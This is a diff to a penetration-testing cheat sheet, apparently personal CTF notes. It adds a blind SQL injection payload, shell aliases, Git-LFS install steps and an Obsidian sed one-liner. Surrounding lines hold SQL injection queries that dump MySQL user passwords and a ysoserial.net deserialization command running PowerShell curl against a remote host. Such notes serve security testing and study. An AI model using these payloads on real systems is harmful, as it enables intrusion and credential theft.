@@ -305,6 +305,10 @@ IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)
 ## Extract
 9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user
 
+###===Blind===
+[WHERE]
+' and password like 'k%'--
+
 [ORACLE]
 ## Get Current Database
 union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
@@ -657,6 +661,15 @@ https://lzone.de/cheat-sheet/jq
 echo "xtest" | cut -c2-
 ```
 
+### Linux Alias
+
+```code
+alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'"
+  * echo "a" | rot13
+alias urldecode='sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b"'
+  * echo 'P%40%24%24w0rd' | urldecode
+```
+
 ### PowerShell Commands
 
 ```powershell
@@ -825,6 +838,25 @@ mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
 
 ```
 
+### Git-LFS
+
+```code
+# Download
+wget https://github.com/git-lfs/git-lfs/releases/download/v2.9.0/git-lfs-linux-amd64-v2.9.0.tar.gz
+
+# Steps
+tar -xf git-lfs-linux-amd64-v2.9.0.tar.gz
+chmod +x install.sh
+sudo ./install.sh
+
+# Inside directory repo
+git lfs install
+git lfs track "*.m"
+git add .gitattributes
+git commit -am "Done"
+git push origin master
+```
+
 ### Objection
 
 ```bash
@@ -861,6 +893,23 @@ https://github.com/pwntester/ysoserial.net
 ##==Json.Net==
 .\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell curl http://10.10.10.10/"
 
+```
+
+### Obsidian (Tricks)
+
+```code
+# GitHub (Example -> https://github.com/H0j3n/EzpzCTF)
+- This is how im manage to upload files and not worry about the location (If there is any other ways let me know)
+- Make one folder name as src in root path (git repo)
+- Then you copy the url path to that image 
+- Example : https://github.com/H0j3n/EzpzCTF/tree/main/src/
+- This a one liner to do that
+- Make sure to change the url to yours.
+- It receive url encode thats why you will see %20 in the url which equivalent to spaces.
+
+======(One Liner)=====
+cat README.md | sed 's/\!\[\[Pasted image /\!\[\]\(https\:\/\/github.com\/H0j3n\/EzpzCTF\/blob\/main\/src\/Pasted%20image%20/g' | sed 's/.png\]\]/.png\)/g' > test.md;mv test.md README.md
+======================
 ```
 
 ### Python Scripter (Burp)
